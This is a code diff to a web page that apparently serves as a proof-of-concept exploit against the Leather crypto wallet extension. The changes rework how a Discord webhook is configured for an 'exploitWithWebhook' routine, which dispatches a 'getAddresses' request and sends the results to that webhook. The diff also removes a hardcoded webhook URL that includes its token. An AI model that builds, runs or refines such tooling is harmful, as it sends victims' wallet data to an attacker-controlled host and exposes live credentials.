@@ -196,9 +196,13 @@
     <script>
         // Configuration
         const CONFIG = {
-            WEBHOOK_URL: 'https://discordapp.com/api/webhooks/1436328098105659475/BF6k132AhabUEVgB5OBudx3kYnSqGgKq6ySyXBlDIxNWUBDHVabANLNIWrulUYiRq5FT',
+            WEBHOOK_URL: '', // Will be auto-loaded from input field
             LEATHER_DETECTED: false
         };
+        
+        // OPTIONAL: Hardcode webhook here for auto-load
+        // Uncomment and set your webhook URL:
+        // CONFIG.WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
         
         // Logging utility
         function log(message, type = 'info') {
@@ -376,12 +380,17 @@
         
         // Full exploit with webhook
         async function exploitWithWebhook() {
+            // Re-check webhook status
+            updateWebhookStatus();
+            
             if (!CONFIG.WEBHOOK_URL) {
                 log('❌ Please configure Discord webhook first', 'error');
+                log('⚠️ Enter webhook URL in the field above', 'error');
                 return;
             }
             
             log('🚀 Starting full exploit sequence...', 'info');
+            log('🔗 Webhook: ' + CONFIG.WEBHOOK_URL.substring(0, 50) + '...', 'info');
             log('📍 Dispatching getAddresses request...', 'info');
             
             // Dispatch the exploit
@@ -439,11 +448,14 @@
         // Initialize
         log('🔍 PoC initialized', 'info');
         
-        // Auto-load webhook from input field
+        // IMPORTANT: Auto-load webhook from input field on page load
+        // This runs immediately to detect pre-filled webhook URL
+        updateWebhookStatus();
+        
         setTimeout(() => {
-            updateWebhookStatus();
             if (CONFIG.WEBHOOK_URL) {
-                log('✅ Discord webhook configured', 'success');
+                log('✅ Discord webhook configured and ready!', 'success');
+                log('🚀 You can now run exploits', 'success');
             } else {
                 log('⚙️ Configure Discord webhook above to start', 'info');
             }
